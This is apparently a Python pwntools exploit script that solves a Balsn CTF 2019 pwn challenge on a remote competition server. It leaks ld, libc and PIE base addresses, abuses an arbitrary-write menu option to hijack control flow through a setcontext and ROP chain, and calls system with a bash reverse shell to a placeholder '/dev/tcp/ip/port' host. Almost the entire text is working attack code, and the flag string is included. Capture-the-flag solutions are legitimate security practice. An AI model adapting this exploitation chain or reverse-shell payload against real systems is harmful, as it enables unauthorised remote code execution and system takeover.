#!/usr/bin/env python
from pwn import *

# Balsn{Cla5s1c_Pwn_p14ygr0und_1n_2019}

context.arch = 'amd64'
y = remote( 'secpwn.balsnctf.com' , 4597 )

def wri( addr , data ):
    y.sendafter( '>' , '6' )
    y.sendafter( 'Addr:' , str( addr ) )
    sleep(0.3)
    y.sendafter( 'Data:' , data )

y.sendafter( '>' , '5' )
y.sendafter( ':' , '%a' * 5 )

y.recvuntil( 'd68p-10220x0.0' )
ld = int( y.recvuntil( 'p' )[:-1] , 16 ) + 0x981d
success( 'ld -> %s' % hex( ld ) )
libc = ld - 0x1ef000
success( 'libc -> %s' % hex( libc ) )
y.recvuntil( 'ap-10220x0.0' )
pie = int( y.recvuntil( 'p' )[:-1] , 16 ) - 0x2019
success( 'pie -> %s' % hex( pie ) )

buf = pie + 0x4020
mapped = ld + 0x2c000
rdx = ld + 0x2b060
setcontext = libc + 0x55e35
gadget = libc + 0x83d84
'''
0x7fa409abbd84 <__GI__IO_puts+196>:	mov    rdx,rbx
0x7fa409abbd87 <__GI__IO_puts+199>:	mov    rsi,r13
0x7fa409abbd8a <__GI__IO_puts+202>:	call   QWORD PTR [r14+0x38]
'''
ret = libc + 0x2535f
pop_rdi = libc + 0x26542
system = libc + 0x52fd0

y.sendline( '1' )

p = flat(
    gadget, 0,
    0, 0,
    0, 0,
    0, setcontext,
    'a' * ( 0xa00 - 0x40 ),
    pop_rdi,
    buf + 0xa00 + 0x20,
    system,
    0,
    'bash -c \'bash -i >& /dev/tcp/ip/port 0>&1\''
)
y.sendline( p )

wri( mapped + 0x190 , p64( buf - 0x3d28 )[:-2] )
wri( rdx + 0xa0 , p64( buf + 0xa00 )[:-2] )
wri( rdx + 0xa8 , p64( ret )[:-2] )

y.interactive()